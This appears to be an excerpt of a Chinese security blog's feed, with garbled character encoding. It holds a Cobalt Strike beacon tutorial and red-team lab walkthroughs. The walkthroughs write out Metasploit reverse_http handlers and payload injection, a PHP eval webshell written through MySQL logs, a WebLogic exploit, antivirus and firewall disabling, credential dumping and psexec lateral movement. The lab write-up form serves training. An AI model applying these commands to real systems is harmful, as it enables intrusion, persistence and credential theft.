Beaconã€‚æ­¤æµé‡å°è£…åœ¨SMBåè®®ä¸­ï¼Œæ‰€ä»¥SMB Beaconç›¸å¯¹éšè”½ï¼Œç»•é˜²ç«å¢™æ—¶å¯èƒ½å‘æŒ¥å¥‡æ•ˆ(ç³»ç»Ÿé˜²ç«å¢™é»˜è®¤æ˜¯å…è®¸445çš„ç«¯å£ä¸å¤–ç•Œé€šä¿¡çš„ï¼Œå…¶ä»–ç«¯å£å¯èƒ½ä¼šå¼¹çª—æé†’ï¼Œä¼šå¯¼è‡´è¿œç¨‹å‘½ä»¤è¡Œåå¼¹shellå¤±è´¥)ã€‚</p><p>SMB Beaconç›‘å¬å™¨å¯¹â€œæå‡æƒé™â€å’Œâ€œæ¨ªå‘æ¸—é€â€ä¸­å¾ˆæœ‰ç”¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/JOHN-FROD/PicGo/blog-img/20220212105842.png" alt="img"></p><p>æ–°å»ºSMBç›‘å¬å™¨</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221643881.png" style="zoom:50%;" /><p>æ´¾ç”Ÿä¼šè¯åˆ°SMBç›‘å¬å™¨</p><p>å³é”®-&gt;æ–°å»ºä¼šè¯-&gt;é€‰æ‹©smbç›‘å¬å™¨ æˆ–è€…ä½¿ç”¨å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn SMB</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221645118.png"></p><p>ç­‰å¾…ä¸€ä¼šï¼Œå°±å¯ä»¥çœ‹åˆ°SMB Beaconï¼Œåœ¨externalå¯ä»¥çœ‹åˆ°âˆâˆå­—ç¬¦</p><p>æ­¤æ—¶SMB Beaconé€šè¿‡çˆ¶çº§çš„HTTP Beaconä¸CSæœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œè€ŒSMB Beaconä¸HTTP Beaconé€šè¿‡SMBåè®®è¿›è¡Œé€šä¿¡ã€‚</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221649191.png"></p><p>å°†SMB Beaconæ’å…¥ç³»ç»Ÿè¿›ç¨‹</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221652561.png"></p><p>æ³¨å…¥åˆ°systemæƒé™çš„ç³»ç»Ÿè¿›ç¨‹ï¼Œè¿”å›çš„ä¼šè¯åˆ™æ˜¯systemæƒé™ï¼Œç®¡ç†å™¨æƒé™å¸¦*ğŸ‘ŒğŸ»</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221653011.png"></p><p>æ­¤æ—¶å¦‚æœæƒ³æ–­å¼€æŸä¸ªä¼šè¯çš„è¿æ¥ï¼Œå¯ä»¥ä½¿ç”¨unlinkå‘½ä»¤ï¼Œæ¯”å¦‚å¦‚æœæƒ³æ–­å¼€192.168.175.144ï¼Œå°±å¯ä»¥åœ¨Beaconä¸­è¾“å…¥<code>unlink 10.10.10.80</code></p><p>å¦‚æœæƒ³å†æ¬¡è¿ä¸Šï¼Œå°±ç›´æ¥è¾“å…¥<code>link </code>10.10.10.80ï¼Œæƒ³ä»å½“å‰ä¸»æœºè¿åˆ°å…¶ä»–ä¸»æœºä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤å‘½ä»¤ã€‚</p><p>åœ¨è¿›ç¨‹ä¸­æ³¨å…¥SMB Beaconåï¼Œä¾¿èƒ½çœ‹åˆ°processä¸ºvmtoolsed.exeçš„æ´¾ç”ŸSMB Beaconã€‚</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221654922.png"></p><h2 id="TCP-Beacon"><a href="#TCP-Beacon" class="headerlink" title="TCP Beacon"></a>TCP Beacon</h2><p>TCP Beaconä¸SMB Beaconç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºè¿™é‡Œä½¿ç”¨çš„æ˜¯TCPåè®®ä¸çˆ¶çº§Beaconè¿›è¡Œé€šä¿¡ï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ä¸Šçº¿æ—¶æµé‡æ˜¯ä¸åŠ å¯†çš„ã€‚</p><p>æ–°å»ºTCP Beacon</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221657163.png" style="zoom:50%;" /><p>ä½¿ç”¨æ–¹æ³•å’Œä¸Šé¢ä¸€è‡´</p><h2 id="Foreign-Beacon"><a href="#Foreign-Beacon" class="headerlink" title="Foreign Beacon"></a>Foreign Beacon</h2><p>ä½¿ç”¨Cobalt Strikeå¤–éƒ¨ç›‘å¬å™¨å¯ä»¥æ´¾ç”Ÿç»™msfçš„meterpreterä¼šè¯ï¼Œè¿™é‡Œæœ‰Foreign HTTPå’ŒForeign HTTPSä¸¤ç§ç›‘å¬å™¨ï¼Œå…¶ä¸­Foreign HTTPSçš„æµé‡æ˜¯åŠ å¯†çš„ã€‚</p><p>msfå…ˆèµ·ä¸€ä¸ªç›‘å¬ï¼Œmsfçš„payloadåªèƒ½ä½¿ç”¨httpæ–¹å¼ï¼Œå› ä¸ºcsçš„ç›‘å¬å™¨åªæ”¯æŒhttpå’Œhttps</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.118</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221712096.png"></p><p>CSé…ç½®ä¸€ä¸ªForeign HTTPï¼Œè¦ä¸msfçš„ç«¯å£ã€ipã€payloadä¸€è‡´</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221709422.png"></p><p>spawn msf æ´¾ç”Ÿç»™msfï¼Œmsfä¼šæ”¶åˆ°ä¼šè¯</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221923888.png"></p><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰å¤ç°æˆåŠŸ</p><p>msfæ´¾ç”Ÿä¼šè¯ç»™cs</p><p>ç”Ÿæˆç›‘å¬å™¨</p><p> <img src="https://raw.githubusercontent.com/chencicici/images/main/202207221929827.png"></p><p>msfæ´¾ç”Ÿä¼šè¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span>   <span class="comment">#é»˜è®¤æƒ…å†µä¸‹ï¼Œpayload_injectæ‰§è¡Œä¹‹åä¼šåœ¨æœ¬åœ°äº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œç”±äºæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨äº§ç”Ÿä¸€ä¸ªï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è®¾ç½®ä¸ºtrue</span></span><br><span class="line"><span class="built_in">set</span> lhost x.x.x.x               <span class="comment">#cobaltstrikeç›‘å¬çš„ip</span></span><br><span class="line"><span class="built_in">set</span> lport 6789                 <span class="comment">#cobaltstrikeç›‘å¬çš„ç«¯å£ </span></span><br><span class="line"><span class="built_in">set</span> session 1                   <span class="comment">#è¿™é‡Œæ˜¯è·å¾—çš„sessionçš„id</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221935284.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;åŸºæœ¬ä½¿ç”¨&quot;&gt;&lt;a href=&quot;#åŸºæœ¬ä½¿ç”¨&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬ä½¿ç”¨&quot;&gt;&lt;/a&gt;åŸºæœ¬ä½¿ç”¨&lt;/h1&gt;&lt;p&gt;Cobalt Strikeä½¿ç”¨C&amp;#x2F;Sæ¶æ„ï¼ŒCobalt Strikeçš„å®¢æˆ·ç«¯è¿æ¥åˆ°å›¢é˜ŸæœåŠ¡å™¨ï¼Œå›¢é˜ŸæœåŠ¡å™¨è¿æ¥åˆ°ç›®æ ‡ï¼Œä¹Ÿå°±æ˜¯è¯´Cobalt Strikeçš„å®¢æˆ·ç«¯ä¸ä¸ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚&lt;/p&gt;
&lt;h2 id=&quot;å¯åŠ¨æœåŠ¡ç«¯&quot;&gt;&lt;a href=&quot;#å¯åŠ¨æœåŠ¡ç«¯&quot; class=&quot;headerlink&quot; title=&quot;å¯åŠ¨æœåŠ¡ç«¯&quot;&gt;&lt;/a&gt;å¯åŠ¨æœåŠ¡ç«¯&lt;/h2&gt;&lt;p&gt;æœåŠ¡ç«¯ä¸€èˆ¬è®¾åœ¨å…¬ç½‘ipçš„æœåŠ¡å™¨ä¸Š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ./teamserver your_ip your_passowrd [config_file]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./teamserver 192.168.31.118 123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å·¥å…·ä½¿ç”¨" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="cs" scheme="https://syst1m.top/tags/cs/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CKçº¢é˜Ÿå®æˆ˜é¶åœº02</title>
    <link href="https://syst1m.top/2022/07/18/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA02/"/>
    <id>https://syst1m.top/2022/07/18/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA02/</id>
    <published>2022-07-18T10:04:35.000Z</published>
    <updated>2022-07-21T13:28:17.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191524897.png"></p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p><code>WEBåˆå§‹å¯†ç é”™è¯¯ï¼Œéœ€è¦ä½¿ç”¨administratorç™»å½•ï¼Œå¯†ç ä¸ºç©º</code></p><table><thead><tr><th>è™šæ‹Ÿæœº</th><th>ç½‘ç»œæ¨¡å¼</th><th>å¯†ç </th></tr></thead><tbody><tr><td>DC</td><td>net1ä»…ä¸»æœºï¼š10.10.10.10</td><td>1qaz@WSX</td></tr><tr><td>PC</td><td>net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.189   net2ä»…ä¸»æœºï¼š10.10.10.201</td><td>1qaz@WSX</td></tr><tr><td>WEB</td><td>net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.18     net2ä»…ä¸»æœºï¼š10.10.10.80</td><td>administra&#x2F;ç©º</td></tr><tr><td>Kali</td><td>net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.118</td><td></td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191620529.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191620506.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191621606.png"></p><p>å¼€å¯weblogicæœåŠ¡åœ¨C:\Oracle\Middleware\user_projects\domains\base_domain\binä¸‹ä»¥ç®¡ç†å‘˜è¿è¡Œ</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191626843.png"></p><h1 id="å¤–ç½‘æ¸—é€"><a href="#å¤–ç½‘æ¸—é€" class="headerlink" title="å¤–ç½‘æ¸—é€"></a>å¤–ç½‘æ¸—é€</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°æ ¹æœ¬pingä¸é€š</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191629862.png" style="zoom:50%;" /><p>é‡‡ç”¨åŠå¼€æ”¾å¼æ–¹å¼æ‰«æ</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191642494.png" style="zoom:50%;" /><p>å¼€æ”¾135å­˜åœ¨smbæœåŠ¡ï¼Œ445å¯èƒ½å­˜åœ¨ms17_010,3389æ˜¯è¿œç¨‹å¯èƒ½å­˜åœ¨å¼±å£ä»¤ï¼Œ7001weblogicå¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œ</p><h2 id="webæ‰“ç‚¹"><a href="#webæ‰“ç‚¹" class="headerlink" title="webæ‰“ç‚¹"></a>webæ‰“ç‚¹</h2><p>ä½¿ç”¨å·¥å…·æ£€æµ‹å‡ºå­˜åœ¨CVE-2020-2551</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191648372.png"></p><p>æœ¬æ¥æƒ³ä½¿ç”¨å·¥å…·ç›´æ¥ä¸Šä¼ webshellï¼Œä½†æ˜¯ä¸Šä¼ æˆåŠŸåèšå‰‘ä¸€ç›´è¿æ¥ä¸ä¸Šï¼Œæ€€ç–‘æ˜¯è¢«æ€è½¯é˜»æ­¢äº†</p><p>é‡æ–°ä½¿ç”¨msfç”Ÿæˆpayloadä¸Šä¼ jspshell</p><p>ä¸Šä¼ è·¯å¾„<code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\1.jsp</code></p><p>è®¿é—®è·¯å¾„<code>http://192.168.31.18:7001/console/framework/skins/wlsconsole/images/1.jsp</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191803812.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191801883.png"></p><p>kaliç›‘å¬è¿”å›ä¸€ä¸ªä¼šè¯ï¼Œè‡ªå¸¦ææƒå¤±è´¥ï¼Œåº”è¯¥æ˜¯è¢«æ€è½¯æ‹¦æˆªäº†</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191804270.png"></p><p>å‘ç°å­˜åœ¨360ï¼Œå¾ˆå¤šæ“ä½œè¢«æ‹¦æˆª</p><p>![image-20220719181132987](&#x2F;Users&#x2F;chenci&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220719181132987.png)</p><p><code>ps</code>ç»§ç»­æŸ¥çœ‹è¿›ç¨‹,å‘ç°ç³»ç»Ÿè¿›ç¨‹services.exe</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191824277.png"></p><p>å°†æˆ‘ä»¬msfåé—¨çš„è¿›ç¨‹è¿ç§»è‡³è¿™ä¸ªè¿›ç¨‹ï¼Œæ‹¿åˆ°systemæƒé™</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191825675.png" style="zoom:50%;" /><p>å…³é—­360</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191836792.png" style="zoom:50%;" /><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹åŸŸå net config workstation</span><br><span class="line">æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ  net view /domain</span><br><span class="line">æŸ¥çœ‹åŸŸå†…ä¸»æœº  net view</span><br><span class="line">æŸ¥è¯¢åŸŸå†…ç”¨æˆ·   net user /domain <span class="comment">#è¯¥å‘½ä»¤åœ¨æœ¬ç¯å¢ƒä¸­éœ€è¦åœ¨systemæƒé™ä¸‹æ‰§è¡Œ</span></span><br><span class="line">æŸ¥çœ‹åŸŸç®¡ç†å‘˜   net group <span class="string">&quot;domain admins&quot;</span> /domain  </span><br><span class="line">æŸ¥çœ‹åŸŸæ§    net group <span class="string">&quot;domain controllers&quot;</span> /domain  </span><br><span class="line">å…³é—­é˜²ç«å¢™netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191833680.png" style="zoom:50%;" /><p>å‘ç°è¿˜æœ‰ä¸€ä¸ªç½‘æ®µï¼ŒåŸŸæ§ä¸€èˆ¬æ˜¯æœ¬æœºçš„dnsåœ°å€</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191841223.png"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡msfæ¥å®šä½</p><p><code>run post/windows/gather/enum_domain æŸ¥çœ‹åŸŸæ§</code></p><p><code>run post/windows/gather/enum_ad_computersæŸ¥çœ‹åŸŸå†…æˆå‘˜</code></p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191846946.png" style="zoom:50%;" /><h2 id="æ¨ªå‘æ‰“ç‚¹"><a href="#æ¨ªå‘æ‰“ç‚¹" class="headerlink" title="æ¨ªå‘æ‰“ç‚¹"></a>æ¨ªå‘æ‰“ç‚¹</h2><p><code>run post/multi/manage/autoroute æ–°å»ºè·¯ç”±</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191856195.png"></p><p><code>run autoroute -p æŸ¥çœ‹è·¯ç”±</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191858908.png"></p><p>backgroundæŒ‚èµ·ä¼šè¯ï¼Œæ·»åŠ routeåªèƒ½ä½¿ç”¨msfè‡ªå¸¦çš„å·¥å…·ï¼Œè¦ä½¿ç”¨åˆ«çš„ï¼Œè¿˜éœ€è¦åå‘ä»£ç†</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191905070.png"></p><p><code>vim /etc/proxychains4.conf æ·»åŠ ä»£ç†</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191908336.png"></p><p>æµ‹è¯•ä»£ç†æ˜¯å¦å¯ç”¨</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207192015948.png"></p><p><code>post/windows/gather/arp_scanner æ‰«æå­˜æ´»ä¸»æœº</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207192017651.png"></p><p>ä½¿ç”¨kiwiæŠ“å–å¯†ç </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191920816.png"></p><p>ç”Ÿæˆpayloadä¸Šçº¿csï¼Œä½¿ç”¨svcæå‡è‡³systemæƒé™</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207201912329.png"></p><h2 id="PsExecä¼ é€’"><a href="#PsExecä¼ é€’" class="headerlink" title="PsExecä¼ é€’"></a>PsExecä¼ é€’</h2><p>ä½¿ç”¨ç°åœ¨è¿™å°ä¸»æœºä¸­è½¬ä¸€ä¸ªç›‘å¬å™¨ï¼Œåˆ©ç”¨psexecæ¨ªå‘ç§»åŠ¨è‡³DCï¼ŒDCæˆåŠŸä¸Šçº¿</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207201917397.png"></p><p>è¿˜å‰©ä¸€å°pcä¹Ÿæ˜¯ä¸€æ ·çš„æ‰“æ³•</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;æ‹“æ‰‘å›¾&quot;&gt;&lt;a href=&quot;#æ‹“æ‰‘å›¾&quot; class=&quot;headerlink&quot; title=&quot;æ‹“æ‰‘å›¾&quot;&gt;&lt;/a&gt;æ‹“æ‰‘å›¾&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207191524897.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;&lt;code&gt;WEBåˆå§‹å¯†ç é”™è¯¯ï¼Œéœ€è¦ä½¿ç”¨administratorç™»å½•ï¼Œå¯†ç ä¸ºç©º&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è™šæ‹Ÿæœº&lt;/th&gt;
&lt;th&gt;ç½‘ç»œæ¨¡å¼&lt;/th&gt;
&lt;th&gt;å¯†ç &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;DC&lt;/td&gt;
&lt;td&gt;net1ä»…ä¸»æœºï¼š10.10.10.10&lt;/td&gt;
&lt;td&gt;1qaz@WSX&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PC&lt;/td&gt;
&lt;td&gt;net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.189   net2ä»…ä¸»æœºï¼š10.10.10.201&lt;/td&gt;
&lt;td&gt;1qaz@WSX&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WEB&lt;/td&gt;
&lt;td&gt;net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.18     net2ä»…ä¸»æœºï¼š10.10.10.80&lt;/td&gt;
&lt;td&gt;administra&amp;#x2F;ç©º&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Kali&lt;/td&gt;
&lt;td&gt;net1æ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œï¼š192.168.31.118&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CKçº¢é˜Ÿå®æˆ˜é¶åœº01</title>
    <link href="https://syst1m.top/2022/07/17/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/"/>
    <id>https://syst1m.top/2022/07/17/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/</id>
    <published>2022-07-17T06:44:33.000Z</published>
    <updated>2022-07-17T09:47:58.988Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png"></p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä¸‰å°æœºå™¨ï¼Œè§£å‹ä½¿ç”¨vmæ‰“å¼€ï¼Œé»˜è®¤å¯†ç hongrisec@2019</p><h1 id="ç½‘ç»œé…ç½®"><a href="#ç½‘ç»œé…ç½®" class="headerlink" title="ç½‘ç»œé…ç½®"></a>ç½‘ç»œé…ç½®</h1><p>win7å¢åŠ ä¸€å—ç½‘å¡,è®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼,ç”¨æ¥è¿é€šæ”»å‡»æœº.ä»…ä¸»æœºç”¨æ¥è¿é€šå†…ç½‘çš„ä¸¤å°é¶æœº<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171452480.png"></p><h2 id="é¶æœº"><a href="#é¶æœº" class="headerlink" title="é¶æœº"></a>é¶æœº</h2><p>win7 net1æ¡¥æ¥ å¤–ç½‘192.168.31.183 net2ä»…ä¸»æœº å†…ç½‘:192.168.52.143<br>win2003 net1ä»…ä¸»æœº å†…ç½‘:192.168.52.141<br>win2003 net1ä»…ä¸»æœº å†…ç½‘:192.168.52.138</p><h2 id="æ”»å‡»æœº"><a href="#æ”»å‡»æœº" class="headerlink" title="æ”»å‡»æœº"></a>æ”»å‡»æœº</h2><p>kali net1æ¡¥æ¥ å¤–ç½‘:192.168.31.118</p><h2 id="å¼€å¯webç¯å¢ƒ"><a href="#å¼€å¯webç¯å¢ƒ" class="headerlink" title="å¼€å¯webç¯å¢ƒ"></a>å¼€å¯webç¯å¢ƒ</h2><p>åœ¨win7å¯åŠ¨phpstudy</p><h1 id="å¤–ç½‘çªç ´"><a href="#å¤–ç½‘çªç ´" class="headerlink" title="å¤–ç½‘çªç ´"></a>å¤–ç½‘çªç ´</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>kaliæ‰«ä¸€ä¸‹ç½‘æ®µ,ç¡®è®¤é¶æœºip<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171513229.png"></p><p>è®¿é—®æ˜¯ä¸€ä¸ªphpæ¢é’ˆ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171511761.png"></p><p>æ¥ç€æ‰«ä¸€ä¸‹ç›®å½•,å­˜åœ¨phpmyadmin<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171517733.png"></p><p>å¼±å¯†ç ç™»å½•æˆåŠŸ root root<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171519266.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>å°è¯•é€šè¿‡æ–‡ä»¶å†™é©¬,ä½†æ˜¯â€“secure0file-privè¢«å†™æ­»<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171525433.png"></p><p>ç»§ç»­å°è¯•æ—¥å¿—å†™é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p>å‘ç°æ—¥å¿—åŠŸèƒ½å…³é—­,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡mysqlå‘½ä»¤å¼€å¯,å¹¶ä¿å­˜ä¿®æ”¹è·¯å¾„å­˜åˆ°æˆ‘ä»¬æŒ‡å®šçš„ç›®å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171529236.png"></p><p>å¼€å¯æ—¥å¿—å¹¶ä¿®æ”¹ä¿å­˜è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;</span><br><span class="line">set global general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171533073.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171534976.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171534585.png"></p><p>æŸ¥è¯¢ä¸€å¥è¯æœ¨é©¬,åˆ©ç”¨æ—¥å¿—å†™å…¥shell.phpä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171536904.png"></p><p>èšå‰‘è¿æ¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171537195.png"></p><h2 id="å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" 